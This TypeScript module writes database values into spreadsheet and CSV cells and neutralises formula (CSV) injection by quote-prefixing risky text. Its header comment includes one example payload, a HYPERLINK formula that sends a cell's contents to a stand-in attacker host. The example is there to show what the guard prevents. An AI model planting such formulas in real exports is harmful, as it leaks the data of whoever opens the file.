/**
 * Cell values on the way out of the database and into a spreadsheet, and the formula-injection
 * guard (CSV injection, CWE-1236).
 *
 * **Why the guard exists.** A spreadsheet program treats a cell that starts with `=`, `+`, `-` or
 * `@` as a formula, and some also run what follows a tab or carriage return. A customer who names
 * themselves `=HYPERLINK("https://evil.example?"&A1,"Click")` would otherwise get a live formula
 * into the spreadsheet of whoever exports the customer list. OWASP's advice, applied here: prefix
 * such a **text** value with a single quote, which every spreadsheet program shows as plain text.
 * Numbers, booleans and dates are written as typed values and are never prefixed: `-5` stays a
 * number, and a typed number can never be a formula.
 *
 * On import, {@link unescapeFormulaPrefix} reverses exactly this prefix, so an export round-trips.
 *
 * @module
 */

/** A value a cell can hold. JSON columns arrive as objects and are written as JSON text. */
export type CellValue = string | number | bigint | boolean | Date | null | undefined | object

/** Characters that make a spreadsheet program read a text cell as a formula. */
export const FORMULA_TRIGGERS: ReadonlySet<string> = new Set(['=', '+', '-', '@', '\t', '\r'])

/**
 * Make a text value safe to put in a spreadsheet cell: prefix `'` when it starts with a formula
 * trigger. Text that is safe is returned unchanged.
 *
 * @example
 * neutralizeFormula('=1+1')   // "'=1+1"
 * neutralizeFormula('Ada')    // 'Ada'
 */
export function neutralizeFormula(text: string): string {
  return text.length > 0 && FORMULA_TRIGGERS.has(text.charAt(0)) ? `'${text}` : text
}

/**
 * Undo {@link neutralizeFormula} on an imported cell: a leading `'` followed by a formula trigger
 * is dropped, so `'=1+1` imports as the text `=1+1` it was exported from. Any other text is
 * returned unchanged (a name such as `'t Hooft` keeps its apostrophe).
 *
 * @example
 * unescapeFormulaPrefix("'=1+1") // '=1+1'
 * unescapeFormulaPrefix("'t Hooft") // "'t Hooft"
 */
export function unescapeFormulaPrefix(text: string): string {
  return text.length > 1 && text.charAt(0) === "'" && FORMULA_TRIGGERS.has(text.charAt(1))
    ? text.slice(1)
    : text
}

/** A cell ready for a writer: plain text (guarded), or a typed number, boolean or date. */
export type OutputCell =
  | { readonly kind: 'text'; readonly text: string }
  | { readonly kind: 'number'; readonly text: string }
  | { readonly kind: 'boolean'; readonly value: boolean }
  | { readonly kind: 'date'; readonly date: Date; readonly time: boolean }
  | { readonly kind: 'empty' }

/** How a column's values should be written. */
export type OutputKind = 'text' | 'number' | 'boolean' | 'date' | 'datetime' | 'json'

/**
 * Turn a database value into an {@link OutputCell}. Text is always passed through
 * {@link neutralizeFormula}; JSON is serialised and then guarded like text; an invalid date or a
 * non-finite number is written as empty rather than as `Invalid Date` or `NaN`.
 *
 * @example
 * toOutputCell('=cmd', 'text') // { kind: 'text', text: "'=cmd" }
 * toOutputCell(12.5, 'number') // { kind: 'number', text: '12.5' }
 */
export function toOutputCell(value: CellValue, kind: OutputKind): OutputCell {
  if (value === null || value === undefined) return { kind: 'empty' }
  switch (kind) {
    case 'number': {
      if (typeof value === 'number')
        return Number.isFinite(value) ? { kind: 'number', text: String(value) } : { kind: 'empty' }
      if (typeof value === 'bigint') return { kind: 'number', text: value.toString() }
      // Decimals arrive as exact strings ('12.50'); keep them exact, but only if they are numbers.
      if (typeof value === 'string' && /^-?\d+(\.\d+)?$/.test(value))
        return { kind: 'number', text: value }
      return textCell(String(value))
    }
    case 'boolean':
      if (typeof value === 'boolean') return { kind: 'boolean', value }
      if (value === 1 || value === 0) return { kind: 'boolean', value: value === 1 }
      return textCell(String(value))
    case 'date':
    case 'datetime': {
      const date = value instanceof Date ? value : new Date(String(value))
      if (Number.isNaN(date.getTime()))
        return typeof value === 'string' ? textCell(value) : { kind: 'empty' }
      return { kind: 'date', date, time: kind === 'datetime' }
    }
    case 'json':
      return textCell(typeof value === 'string' ? value : (JSON.stringify(value) ?? ''))
    case 'text':
      return textCell(
        value instanceof Date
          ? value.toISOString()
          : typeof value === 'object'
            ? (JSON.stringify(value) ?? '')
            : String(value),
      )
  }
}

function textCell(text: string): OutputCell {
  return { kind: 'text', text: neutralizeFormula(text) }
}

/**
 * The text a CSV file gets for a cell: dates as ISO 8601 (`2026-11-18` for dates,
 * `2026-11-18T10:00:00.000Z` for timestamps), booleans as `true`/`false`.
 *
 * @example
 * cellText({ kind: 'boolean', value: true }) // 'true'
 */
export function cellText(cell: OutputCell): string {
  switch (cell.kind) {
    case 'empty':
      return ''
    case 'text':
    case 'number':
      return cell.text
    case 'boolean':
      return cell.value ? 'true' : 'false'
    case 'date':
      return cell.time ? cell.date.toISOString() : cell.date.toISOString().slice(0, 10)
  }
}
